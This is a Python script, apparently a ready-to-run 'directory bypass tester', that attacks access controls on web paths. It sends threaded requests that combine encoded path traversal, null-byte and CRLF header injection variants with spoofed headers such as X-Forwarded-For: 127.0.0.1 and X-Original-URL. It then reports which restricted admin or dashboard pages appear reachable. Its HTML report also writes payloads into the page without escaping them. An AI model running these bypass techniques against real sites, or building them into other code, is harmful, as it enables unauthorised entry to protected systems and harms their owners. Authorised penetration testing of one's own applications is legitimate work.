#!/usr/bin/env python3
"""
dir_bypass_pro.py - Professional Directory Bypass Tester
Author: Caio Henrique
Version: 1.0
"""

import argparse
import concurrent.futures
import csv
import hashlib
import json
import os
import re
import socket
import sys
import time
from datetime import datetime
from urllib.parse import urlparse, quote, unquote

import requests
from requests.auth import HTTPBasicAuth

# Configurações globais
BANNER = r"""
╔═══════════════════════════════════════════════════╗
║ ____                                              ║
║|  _ \                                             ║
║| |_) | _   _  _ __    __ _  ___  ___              ║
║|  _ < | | | || '_ \  / _` |/ __|/ __|             ║
║| |_) || |_| || |_) || (_| |\__ \\__ \             ║
║|____/  \__, || .__/  \__,_||___/|___/             ║  
║         __/ || |                                  ║   
║        |___/ |_|                                  ║
╠═══════════════════════════════════════════════════╣
║ By: Caio | Directory Bypass Tester v1.0           ║
╚═══════════════════════════════════════════════════╝
"""

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}

BYPASS_HEADERS = {
    "X-Original-URL": "",
    "X-Rewrite-URL": "",
    "X-Forwarded-For": "127.0.0.1",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "Referer": "https://google.com",
    "X-Forwarded-Host": "localhost",
}

HTTP_METHODS = ["GET", "POST"]
MAX_RETRIES = 3
TIMEOUT = 10
MAX_THREADS = 20

class BypassTester:
    def __init__(self, args):
        self.args = args
        self.base_url = self.normalize_url(args.url)
        self.base_response = None
        self.payloads = []
        self.results = []
        self.session = requests.Session()
        self.session.max_redirects = 0
        self.session.verify = not args.ignore_ssl
        self.proxies = self.setup_proxies()
        
        if args.auth:
            self.session.auth = HTTPBasicAuth(*args.auth.split(':', 1))
        
        if args.verbose:
            print("[*] Configurações carregadas")
            print(f"    URL Base: {self.base_url}")
            print(f"    Threads: {args.threads}")
            print(f"    Timeout: {args.timeout}s")

    def setup_proxies(self):
        if not self.args.proxy:
            return {}
        
        proxy = self.args.proxy
        if proxy.startswith('socks'):
            return {'http': proxy, 'https': proxy}
        return {'http': proxy, 'https': proxy}

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/') + '/'

    def get_base_response(self):
        try:
            resp = self.session.get(
                self.base_url,
                headers=DEFAULT_HEADERS,
                timeout=self.args.timeout,
                proxies=self.proxies
            )
            self.base_response = {
                'status': resp.status_code,
                'size': len(resp.content),
                'hash': hashlib.sha256(resp.content).hexdigest(),
                'content': resp.text
            }
            if self.args.verbose:
                print(f"[*] Resposta base: HTTP {self.base_response['status']} | Size: {self.base_response['size']} bytes")
        except Exception as e:
            print(f"[!] Erro ao obter resposta base: {str(e)}")
            sys.exit(1)

    def load_wordlist(self):
        try:
            with open(self.args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                lines = set(line.strip() for line in f if line.strip())
                self.payloads = sorted(lines)
                
            if not self.payloads:
                print("[!] Wordlist vazia após limpeza")
                sys.exit(1)
                
            if self.args.verbose:
                print(f"[*] Wordlist carregada: {len(self.payloads)} payloads únicos")
        except Exception as e:
            print(f"[!] Erro ao carregar wordlist: {str(e)}")
            sys.exit(1)

    def generate_variations(self, payload):
        variations = set()
        
        # Formatações básicas
        formats = [
            payload,
            f"/{payload}",
            f"{payload}/",
            f"/{payload}/",
            f"/{payload}//",
            f"/{payload};",
            f"/{payload}?",
            f"/{payload}.json",
            f"/{payload}.php",
            f"/{payload}.asp",
            f"/{payload}/.",
            f"/./{payload}/",
            f";{payload}",
            f"%20{payload}",
            f"{payload}%20",
            f"%09{payload}",
            f"{payload}%09",
            f"%00{payload}",
            f"{payload}%00",
            quote(payload),
            quote(payload, safe=''),
            unquote(payload),
            payload.upper(),
            payload.lower(),
            payload.title(),
            payload + '%00',
            payload + '~1',
            payload + '.',
            '.' + payload,
        ]

        # Técnicas avançadas de bypass
        advanced = [
            f"/%2e%2e%2f{payload}",
            f"/{payload}%2f%2e%2e",
            f"/{payload}%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a",
            f"/{payload}%0d%0aX-Bypass-Test:1",
            f"/..%2f{payload}",
            f"/..%2f..%2f{payload}",
            f"/{payload}%23",
            f"/{payload}%27",
            f"/{payload}%22",
            f"/{payload}%5c",
        ]

        variations.update(formats)
        variations.update(advanced)
        return list(variations)

    def test_payload(self, payload):
        results = []
        
        # Testar payload básico
        self.test_variation(payload, results)
        
        # Testar variações
        for variation in self.generate_variations(payload):
            self.test_variation(variation, results)
            
            # Testar com headers especiais
            self.test_with_headers(variation, results)
            
        return results

    def test_variation(self, payload, results):
        for method in HTTP_METHODS:
            for i in range(MAX_RETRIES):
                try:
                    url = self.base_url + payload.lstrip('/')
                    headers = DEFAULT_HEADERS.copy()
                    
                    resp = self.session.request(
                        method,
                        url,
                        headers=headers,
                        timeout=self.args.timeout,
                        proxies=self.proxies,
                        allow_redirects=False
                    )
                    
                    result = self.analyze_response(resp, payload, method)
                    results.append(result)
                    break
                except (requests.exceptions.RequestException, socket.timeout):
                    if i < MAX_RETRIES - 1:
                        time.sleep(0.5)
                        continue
                    if self.args.verbose:
                        print(f"[!] Timeout para payload: {payload}")

    def test_with_headers(self, payload, results):
        for header_name, header_value in BYPASS_HEADERS.items():
            for method in HTTP_METHODS:
                for i in range(MAX_RETRIES):
                    try:
                        url = self.base_url.rstrip('/')
                        headers = DEFAULT_HEADERS.copy()
                        headers[header_name] = header_value if header_value else payload
                        
                        resp = self.session.request(
                            method,
                            url,
                            headers=headers,
                            timeout=self.args.timeout,
                            proxies=self.proxies,
                            allow_redirects=False
                        )
                        
                        result = self.analyze_response(resp, f"{header_name}: {payload}", method)
                        results.append(result)
                        break
                    except (requests.exceptions.RequestException, socket.timeout):
                        if i < MAX_RETRIES - 1:
                            time.sleep(0.5)
                            continue
                        if self.args.verbose:
                            print(f"[!] Timeout para header: {header_name}")

    def analyze_response(self, response, payload, method):
        content = response.text
        size = len(response.content)
        content_hash = hashlib.sha256(response.content).hexdigest()
        
        # Detecção de indicadores de bypass
        bypass_indicator = False
        suspicious_keywords = [
            "admin", "dashboard", "login", "welcome", "root",
            "manage", "control", "panel", "configuration", "error"
        ]
        
        # Verificar diferenças significativas
        size_diff = abs(size - self.base_response['size'])
        content_diff = content_hash != self.base_response['hash']
        
        # Verificar códigos de sucesso ou diferenças
        if response.status_code != self.base_response['status']:
            if response.status_code < 400 or response.status_code == 403:
                bypass_indicator = True
        elif size_diff > 100 or content_diff:
            bypass_indicator = any(kw in content.lower() for kw in suspicious_keywords)
        
        # Verificar headers especiais
        special_headers = any(header in response.headers for header in BYPASS_HEADERS.keys())
        
        return {
            'payload': payload,
            'method': method,
            'url': response.url,
            'status': response.status_code,
            'size': size,
            'hash': content_hash,
            'time': datetime.now().isoformat(),
            'bypass': bypass_indicator,
            'special_header': special_headers,
            'response': content[:500] if self.args.verbose else None
        }

    def run_tests(self):
        self.get_base_response()
        self.load_wordlist()
        
        total = len(self.payloads)
        completed = 0
        start_time = time.time()
        
        print(f"[*] Iniciando testes com {total} payloads...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            future_to_payload = {
                executor.submit(self.test_payload, payload): payload
                for payload in self.payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload = future_to_payload[future]
                try:
                    results = future.result()
                    self.results.extend(results)
                except Exception as e:
                    print(f"[!] Erro ao testar payload '{payload}': {str(e)}")
                
                completed += 1
                if self.args.verbose:
                    elapsed = time.time() - start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    print(f"\r[+] Progresso: {completed}/{total} | "
                          f"Velocidade: {rate:.2f} req/s | "
                          f"Tempo: {elapsed:.2f}s", end='')
        
        print("\n[+] Testes concluídos!")

    def generate_report(self):
        if not self.results:
            print("[!] Nenhum resultado para reportar")
            return
        
        # Filtra apenas bypasses bem-sucedidos
        bypasses = [r for r in self.results if r['bypass']]
        
        # Relatório de console
        print("\n══════════════ RESULTADOS ══════════════")
        print(f"Total de testes: {len(self.results)}")
        print(f"Bypasses detectados: {len(bypasses)}")
        
        if bypasses:
            print("\n[!] BYPASSES DETECTADOS:")
            for result in bypasses:
                print(f" → Payload: {result['payload']}")
                print(f"   Método: {result['method']}")
                print(f"   Status: {result['status']}")
                print(f"   Tamanho: {result['size']} bytes")
                print(f"   URL: {result['url']}")
                print("   " + "-"*40)
        
        # Exportar resultados
        if self.args.output:
            ext = os.path.splitext(self.args.output)[1].lower()
            try:
                if ext == '.csv':
                    self.export_csv(self.args.output)
                elif ext == '.json':
                    self.export_json(self.args.output)
                elif ext == '.html':
                    self.export_html(self.args.output)
                else:
                    print(f"[!] Formato não suportado: {ext}")
            except Exception as e:
                print(f"[!] Erro ao exportar resultados: {str(e)}")

    def export_csv(self, filename):
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'time', 'method', 'payload', 'url', 
                'status', 'size', 'hash', 'bypass'
            ])
            writer.writeheader()
            writer.writerows(self.results)

    def export_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2)

    def export_html(self, filename):
        # Implementação básica de relatório HTML
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Relatório de Bypass</title>
            <style>
                body {{ font-family: monospace; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                tr:nth-child(even) {{ background-color: #f2f2f2; }}
                .bypass {{ background-color: #ffcccc; }}
            </style>
        </head>
        <body>
            <h1>Relatório de Bypass - {self.base_url}</h1>
            <p>Data: {datetime.now().isoformat()}</p>
            <p>Total de testes: {len(self.results)}</p>
            <p>Bypasses detectados: {len([r for r in self.results if r['bypass']])}</p>
            
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Método</th>
                    <th>Payload</th>
                    <th>Status</th>
                    <th>Tamanho</th>
                    <th>Bypass</th>
                </tr>
                {"".join(
                    f'<tr class="{"bypass" if r["bypass"] else ""}">'
                    f'<td>{r["time"]}</td>'
                    f'<td>{r["method"]}</td>'
                    f'<td>{r["payload"]}</td>'
                    f'<td>{r["status"]}</td>'
                    f'<td>{r["size"]}</td>'
                    f'<td>{"✅" if r["bypass"] else "❌"}</td>'
                    '</tr>'
                    for r in self.results
                )}
            </table>
        </body>
        </html>
        """
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

def validate_url(url):
    pattern = re.compile(
        r'^(https?://)?'  # protocolo
        r'(([A-Z0-9-]+\.)+[A-Z]{2,63})'  # domínio
        r'(:\d+)?'  # porta
        r'(/[^\s]*)?$', re.IGNORECASE)  # caminho
    return bool(pattern.match(url))

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description='Ferramenta profissional de bypass de diretórios',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Argumentos obrigatórios
    parser.add_argument('url', help='URL alvo (ex: http://exemplo.com/admin)')
    parser.add_argument('wordlist', help='Arquivo com payloads para teste')
    
    # Opcionais
    parser.add_argument('-t', '--threads', type=int, default=MAX_THREADS, 
                       help='Número de threads paralelas')
    parser.add_argument('-o', '--output', help='Arquivo de saída (CSV/JSON/HTML)')
    parser.add_argument('--timeout', type=float, default=TIMEOUT,
                       help='Timeout por requisição (segundos)')
    parser.add_argument('--ignore-ssl', action='store_true',
                       help='Ignorar erros de certificado SSL')
    parser.add_argument('--proxy', help='Proxy (HTTP/HTTPS/SOCKS)')
    parser.add_argument('--auth', help='Autenticação HTTP (user:pass)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Modo verboso (mostrar detalhes)')
    
    args = parser.parse_args()
    
    # Validações
    if not validate_url(args.url):
        print("[!] URL inválida. Use formato: http(s)://host/path")
        sys.exit(1)
        
    if not os.path.isfile(args.wordlist):
        print("[!] Wordlist não encontrada")
        sys.exit(1)
        
    if args.threads > 50:
        print("[!] Número de threads muito alto. Usando máximo de 50")
        args.threads = 50
    
    # Executar teste
    tester = BypassTester(args)
    tester.run_tests()
    tester.generate_report()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário")
        sys.exit(1)
